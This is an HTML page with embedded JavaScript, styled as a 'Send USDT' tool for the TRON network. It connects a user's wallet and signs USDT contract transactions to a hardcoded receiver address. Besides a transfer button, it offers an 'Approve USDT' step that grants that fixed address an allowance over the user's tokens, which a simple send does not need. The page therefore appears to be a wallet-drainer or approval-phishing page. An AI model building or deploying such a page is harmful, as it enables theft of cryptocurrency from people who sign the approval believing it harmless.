<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Send USDT</title>

<link rel="icon" href="https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png">

<script src="https://unpkg.com/@walletconnect/sign-client@2.17.0/dist/index.umd.js"></script>

<style>
body{margin:0;background:#0d0f12;color:#fff;font-family:-apple-system}
.header{padding:16px;text-align:center;border-bottom:1px solid #222}
.container{padding:16px}
.box{border:1px solid #2a2d33;border-radius:12px;padding:14px;margin-bottom:16px;background:#121417}
.label{font-size:12px;color:#888;margin-bottom:6px}
.input{width:100%;background:none;border:none;color:#fff;font-size:16px}
.btn{width:100%;padding:14px;margin-top:10px;border-radius:20px;border:none;font-weight:bold}
.primary{background:#2ecc71;color:#000}
.secondary{background:#444;color:#fff}
.status{font-size:12px;color:#aaa;margin-bottom:10px}
.receiver{color:#ccc;font-size:13px}
</style>
</head>

<body>

<div class="header">USDT (TRON)</div>

<div class="container">

<div id="status" class="status">Not Connected</div>

<div class="box">
  <div class="label">Receiver</div>
  <div class="receiver">TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV</div>
</div>

<div class="box">
  <div class="label">Amount</div>
  <input id="amount" class="input" placeholder="0.00" type="number">
</div>

<button class="btn secondary" onclick="connectWallet()">Connect Wallet</button>

<button class="btn primary" onclick="approveUSDT()">Approve USDT</button>

<button class="btn primary" onclick="sendUSDT()">Send USDT</button>

</div>

<script>
const PROJECT_ID="171db6da15a54effc1b4a06f889a3c3f";
const TRON_CHAIN="tron:0x2b6653dc";
const USDT="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const RECEIVER="TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";

let client,session,address;

function setStatus(t){document.getElementById("status").innerText=t;}

function getClient(){
  return window.SignClient || window.WalletConnectSignClient?.SignClient;
}

async function connectWallet(){
  if(window.tronWeb?.defaultAddress?.base58){
    address=window.tronWeb.defaultAddress.base58;
    setStatus("Connected: "+address);
    return;
  }

  const SignClient=getClient();
  client=await SignClient.init({projectId:PROJECT_ID});

  const {uri,approval}=await client.connect({
    requiredNamespaces:{
      tron:{methods:["tron_signTransaction"],chains:[TRON_CHAIN],events:[]}
    }
  });

  if(uri){
    location.href="https://link.trustwallet.com/wc?uri="+encodeURIComponent(uri);
  }

  session=await approval();
  address=session.namespaces.tron.accounts[0].split(":")[2];
  setStatus("Connected: "+address);
}

async function approveUSDT(){
  if(!address) return alert("Connect wallet first");

  const amount=document.getElementById("amount").value;
  if(!amount) return alert("Enter amount");

  const hexAddr=base58ToHex(RECEIVER).replace("41","").padStart(64,"0");
  const hexAmount=Math.floor(amount*1e6).toString(16).padStart(64,"0");

  await sendTx("approve(address,uint256)",hexAddr+hexAmount);

  alert("Approval done");
}

async function sendUSDT(){
  if(!address) return alert("Connect wallet first");

  const amount=document.getElementById("amount").value;
  if(!amount) return alert("Enter amount");

  const hexAddr=base58ToHex(RECEIVER).replace("41","").padStart(64,"0");
  const hexAmount=Math.floor(amount*1e6).toString(16).padStart(64,"0");

  await sendTx("transfer(address,uint256)",hexAddr+hexAmount);

  alert("Transfer sent");
}

async function sendTx(selector,params){
  const tx=await fetch("https://api.trongrid.io/wallet/triggersmartcontract",{
    method:"POST",
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({
      owner_address:address,
      contract_address:USDT,
      function_selector:selector,
      parameter:params,
      fee_limit:100000000,
      visible:true
    })
  }).then(r=>r.json());

  let signed;

  if(window.tronWeb){
    signed=await window.tronWeb.trx.sign(tx.transaction);
  }else{
    signed=await client.request({
      topic:session.topic,
      chainId:TRON_CHAIN,
      request:{
        method:"tron_signTransaction",
        params:{address,transaction:tx.transaction}
      }
    });
  }

  await fetch("https://api.trongrid.io/wallet/broadcasttransaction",{
    method:"POST",
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(signed)
  });
}

const ALPHABET="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
function base58ToHex(addr){
  let num=BigInt(0);
  for(let c of addr){num=num*58n+BigInt(ALPHABET.indexOf(c));}
  let hex=num.toString(16);
  if(hex.length%2) hex="0"+hex;
  return "41"+hex.slice(2,-8);
}
</script>

</body>
</html>
